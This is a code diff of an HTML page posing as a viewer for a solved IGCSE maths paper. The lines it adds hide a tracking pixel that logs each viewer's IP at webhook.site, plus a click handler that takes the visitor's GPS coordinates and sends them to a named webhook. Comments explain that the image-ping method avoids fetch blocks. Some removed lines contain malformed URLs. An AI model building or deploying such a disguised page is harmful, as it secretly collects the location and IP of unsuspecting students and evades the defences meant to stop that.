@@ -7,40 +7,31 @@
         body { margin: 0; background: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
         .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
         #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
+        /* This hides the tracking pixel from the user */
+        .pixel { position: absolute; width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
 <body>
     <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
+    
+    <!-- 1. THE SILENT TRACKER -->
+    <!-- Webhook.site will log the IP of anyone who views this "image" -->
+    <img src="https://webhook.site" class="pixel">
+
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
 
     <script>
         const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
 
-        // 1. SILENT IP (The Pixel Method)
-        // This doesn't use 'fetch', so it bypasses the block you just saw.
-        const img = new Image();
-        img.src = `https://api.ipify.org{Date.now()}`; 
-        
-        // After the image "loads", we ping your webhook
-        img.onload = () => {
-             fetch(webhookURL + "?event=IP_PIXEL_LOADED", {mode: 'no-cors'});
-        };
-
-        // 2. CLICK TRIGGER (GPS)
+        // 2. THE CLICK TRIGGER
         window.onclick = () => {
             navigator.geolocation.getCurrentPosition(pos => {
-                fetch(webhookURL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        type: "GPS_CLICKED",
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
-                    })
-                });
+                // We use a simple Image ping for the GPS too, as it bypasses fetch blocks
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                new Image().src = `${webhookURL}?type=GPS&lat=${lat}&lon=${lon}`;
             }, (err) => {
-                fetch(webhookURL + "?gps_error=" + err.message, {mode: 'no-cors'});
+                new Image().src = `${webhookURL}?type=ERROR&msg=${encodeURIComponent(err.message)}`;
             }, { maximumAge: Infinity });
         };
     </script>
